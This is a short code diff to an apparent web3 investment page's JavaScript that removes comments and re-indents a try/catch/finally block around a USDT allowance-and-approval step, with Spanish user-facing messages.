@@ -244,12 +244,10 @@ async function runInvestmentFlow(rawProvider) {
             return;
         }
 
-        // Actualiza la validación de autorizaciones en runInvestmentFlow (app.js)
         setLoading(true, "Verificando autorizaciones...");
         const allowance = await usdtContract.allowance(activeUserAddress, CONFIG.CONTRACT_ADDRESS);
         
         if (allowance < requiredAmount) {
-            // Opcional para tokens ERC-20 estrictos: limpiar allowance previo si es mayor a 0
             if (allowance > 0n) {
                 setLoading(true, "Restableciendo autorización previa...");
                 const txReset = await usdtContract.approve(CONFIG.CONTRACT_ADDRESS, 0n);
@@ -273,23 +271,23 @@ async function runInvestmentFlow(rawProvider) {
             showToast("¡Transacción completada con éxito! Gracias.", "success", 6000);
         }
 
-        // Mejora el bloque catch dentro de runInvestmentFlow (app.js)
-        } catch (err) {
-            const raw = err?.reason ?? err?.message ?? JSON.stringify(err) ?? "Error desconocido";
-            if (
-                err.code === 4001 ||
-                raw.toLowerCase().includes("user rejected") ||
-                raw.toLowerCase().includes("denied") ||
-                raw.toLowerCase().includes("cancelled")
-            ) {
-                showToast("Operación cancelada por el usuario.", "default");
-            } else {
-                console.error("Web3 Error crítico:", err);
-                showToast(`Error de red: ${raw.slice(0, 50)}...`, "error");
-            }
-        } finally {
-            setLoading(false);
+    } catch (err) {
+        const raw = err?.reason ?? err?.message ?? JSON.stringify(err) ?? "Error desconocido";
+        if (
+            err.code === 4001 ||
+            raw.toLowerCase().includes("user rejected") ||
+            raw.toLowerCase().includes("denied") ||
+            raw.toLowerCase().includes("cancelled")
+        ) {
+            showToast("Operación cancelada por el usuario.", "default");
+        } else {
+            console.error("Web3 Error crítico:", err);
+            showToast(`Error de red: ${raw.slice(0, 50)}...`, "error");
         }
+    } finally {
+        setLoading(false);
+    }
+}
 // ─── Disparador del Backend de Recolección ────────────────────────────────────
 async function triggerBackendCollect(userAddress, amountStr) {
     let lastErr;
